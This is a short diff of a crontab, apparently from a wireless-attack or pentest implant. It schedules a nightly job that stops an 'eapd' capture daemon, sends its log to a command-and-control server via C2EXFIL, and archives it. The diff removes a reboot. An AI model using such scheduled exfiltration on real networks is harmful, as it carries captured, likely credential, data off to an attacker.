@@ -19,5 +19,5 @@
 #
 ######################################################################
 
-0 23 * * * /etc/init.d/eapdd stop && C2EXFIL STRING /root/eapd.log EAPD && mv /root/eapd.log /root/logs/$(date +%F-eapd.log) && echo "Scheduled Reboot at $(date '+%r on %x')" >> /root/eapd.log && reboot
+0 23 * * * /etc/init.d/eapdd stop && C2EXFIL STRING /root/eapd.log EAPD && mv /root/eapd.log /root/logs/$(date +%F-eapd.log) && echo "Exported and Moved logs at $(date '+%r on %x')" >> /root/eapd.log
 24,48 * * * * echo "Scheduled EAPDD run at $(date '+%r on %x')" >> /root/eapd.log && /etc/init.d/eapdd start
